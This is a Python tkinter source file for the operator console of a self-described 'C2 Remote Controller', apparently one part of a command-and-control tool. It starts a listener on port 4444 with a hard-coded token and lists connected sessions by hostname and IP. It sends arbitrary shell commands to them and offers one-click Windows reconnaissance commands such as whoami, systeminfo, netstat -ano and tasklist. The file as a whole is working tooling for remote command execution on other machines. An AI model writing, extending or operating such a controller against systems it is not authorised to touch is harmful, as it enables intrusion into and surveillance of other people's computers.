import threading
import tkinter as tk
from tkinter import ttk

from server import C2Server


class RemoteAdminGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("C2 Remote Controller & Session Manager")
        self.root.geometry("750x600")

        self.server = None
        self.running = False
        self.displayed_sessions = []

        # --- Server Settings ---
        config_frame = ttk.LabelFrame(root, text="Server Settings")
        config_frame.pack(fill="x", padx=8, pady=4)

        ttk.Label(config_frame, text="Host:").grid(row=0, column=0, padx=4, pady=4, sticky="e")
        self.host_var = tk.StringVar(value="0.0.0.0")
        ttk.Entry(config_frame, textvariable=self.host_var, width=15).grid(row=0, column=1, padx=4, pady=4)

        ttk.Label(config_frame, text="Port:").grid(row=0, column=2, padx=4, pady=4, sticky="e")
        self.port_var = tk.StringVar(value="4444")
        ttk.Entry(config_frame, textvariable=self.port_var, width=8).grid(row=0, column=3, padx=4, pady=4)

        ttk.Label(config_frame, text="Token:").grid(row=0, column=4, padx=4, pady=4, sticky="e")
        self.token_var = tk.StringVar(value="sjaak")
        ttk.Entry(config_frame, textvariable=self.token_var, width=15).grid(row=0, column=5, padx=4, pady=4)

        self.start_btn = ttk.Button(config_frame, text="Start Server", command=self.start_server)
        self.start_btn.grid(row=0, column=6, padx=8, pady=4)

        # --- Sessions & Preset Commands Frame ---
        middle_frame = ttk.Frame(root)
        middle_frame.pack(fill="both", expand=True, padx=8, pady=4)

        # Session List
        session_frame = ttk.LabelFrame(middle_frame, text="Active Sessions")
        session_frame.pack(side="left", fill="both", expand=True, padx=(0, 4))

        self.session_list = tk.Listbox(session_frame, selectmode=tk.SINGLE)
        self.session_list.pack(fill="both", expand=True, padx=4, pady=4)

        # Preset Buttons
        preset_frame = ttk.LabelFrame(middle_frame, text="Quick Commands")
        preset_frame.pack(side="right", fill="y", padx=(4, 0))

        presets = [
            ("Whoami", "whoami"),
            ("IP Config", "ipconfig /all"),
            ("System Info", "systeminfo"),
            ("List Files", "dir"),
            ("Network Connections", "netstat -ano"),
            ("Task List", "tasklist")
        ]

        for label, cmd in presets:
            btn = ttk.Button(
                preset_frame, 
                text=label, 
                command=lambda c=cmd: self.execute_preset(c)
            )
            btn.pack(fill="x", padx=6, pady=3)

        # --- Manual Command Entry ---
        cmd_frame = ttk.LabelFrame(root, text="Manual Command Execution")
        cmd_frame.pack(fill="x", padx=8, pady=4)

        self.command_entry = ttk.Entry(cmd_frame)
        self.command_entry.pack(side="left", fill="x", expand=True, padx=4, pady=4)
        self.command_entry.bind("<Return>", lambda e: self.send_command())

        self.send_btn = ttk.Button(cmd_frame, text="Send", command=self.send_command)
        self.send_btn.pack(side="right", padx=4, pady=4)

        # --- Output Console ---
        log_frame = ttk.LabelFrame(root, text="Console Output & Responses")
        log_frame.pack(fill="both", expand=True, padx=8, pady=4)

        self.output = tk.Text(log_frame, height=10, bg="#1e1e1e", fg="#00ff00", insertbackground="white")
        self.output.pack(fill="both", expand=True, padx=4, pady=4)

    def log(self, msg):
        """Thread-safe logging to GUI console."""
        def _append():
            self.output.insert(tk.END, str(msg) + "\n")
            self.output.see(tk.END)
        self.root.after(0, _append)

    def start_server(self):
        if self.server:
            return

        host = self.host_var.get()
        port = int(self.port_var.get())
        token = self.token_var.get()

        try:
            self.server = C2Server(host, port, token, log=self.log)
            self.server.start()
            self.running = True
            self.start_btn.config(state="disabled")
            self.log(f"[+] Server successfully started on {host}:{port}")
            self.schedule_session_updates()
        except Exception as e:
            self.log(f"[-] Error starting server: {e}")

    def schedule_session_updates(self):
        if self.running:
            self.update_sessions()
            self.root.after(2000, self.schedule_session_updates)

    def update_sessions(self):
        if not self.running or not self.server:
            return

        selected_session_id = None
        current_session = self.selected_session()
        if current_session:
            selected_session_id = current_session.id

        self.session_list.delete(0, tk.END)
        self.displayed_sessions.clear()

        for session in self.server.sessions:
            if getattr(session, 'alive', True):
                hostname = session.info.get('hostname') if hasattr(session, 'info') and isinstance(session.info, dict) else "Unknown"
                addr = session.addr[0] if getattr(session, 'addr', None) else "N/A"
                
                self.session_list.insert(tk.END, f"Session {session.id}: {hostname} ({addr})")
                self.displayed_sessions.append(session)

                if selected_session_id is not None and session.id == selected_session_id:
                    new_idx = len(self.displayed_sessions) - 1
                    self.session_list.selection_set(new_idx)
                    self.session_list.activate(new_idx)

    def selected_session(self):
        if not self.server:
            return None
        sel = self.session_list.curselection()
        if not sel:
            return None
        idx = int(sel[0])
        
        if idx >= len(self.displayed_sessions):
            return None
        session = self.displayed_sessions[idx]
        if not getattr(session, 'alive', True):
            return None
        return session

    def execute_preset(self, cmd_text):
        """Executes a preset command on the active session."""
        self.send_command(preset_cmd=cmd_text)

    def send_command(self, preset_cmd=None):
        session = self.selected_session()
        if not session:
            self.log("[-] No active session selected in the list!")
            return

        cmd = preset_cmd if preset_cmd else self.command_entry.get().strip()
        if not cmd:
            return

        if not preset_cmd:
            self.command_entry.delete(0, tk.END)

        self.log(f"[>] [{session.id}] Executing: {cmd}")

        def worker():
            try:
                resp = session.command({"type": "exec", "cmd": cmd})
                if resp and "data" in resp:
                    # Direct text rendering matching client.py output format
                    output_data = resp["data"]
                    self.log(f"[+] Output from Session {session.id}:\n{output_data}")
                else:
                    self.log(f"[-] No valid response received from Session {session.id}")
            except Exception as e:
                self.log(f"[ERROR] Execution error on Session {session.id}: {e}")

        threading.Thread(target=worker, daemon=True).start()


if __name__ == "__main__":
    root = tk.Tk()
    app = RemoteAdminGUI(root)
    root.mainloop()
